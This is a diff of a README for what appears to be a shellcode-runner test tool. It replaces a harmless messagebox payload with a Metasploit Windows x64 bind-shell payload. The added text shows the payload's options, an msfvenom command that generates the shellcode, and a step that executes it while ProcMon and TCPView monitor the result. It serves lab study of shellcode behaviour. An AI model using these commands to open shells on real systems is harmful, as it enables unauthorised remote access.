@@ -152,10 +152,30 @@ exit(0)                                 = ?
 
 ```
 $ make x64
-$ msfvenom -p windows/x64/messagebox -b \x00 -f raw -o win_shcode.bin
+$ msfconsole
+msf6 > info payload/windows/x64/shell_bind_tcp
+...
+Basic options:
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+LPORT     4444             yes       The listen port
+RHOST                      no        The target address
+
+Description:
+  Listen for a connection and spawn a command shell (Windows x64)
+...
+msf6 > exit
+$ msfvenom -p windows/x64/shell_bind_tcp -f raw -o shellcode.bin
 ```
 
-Open `ProcMon` and `TCPView` then `shexec.exe win_shcode.bin`
+Open `ProcMon` and `TCPView` then:
+
+```
+> .\shexec.exe shellcode.bin
+```
+
+![TCPView](img/tcpview.png)
 
 # References
 
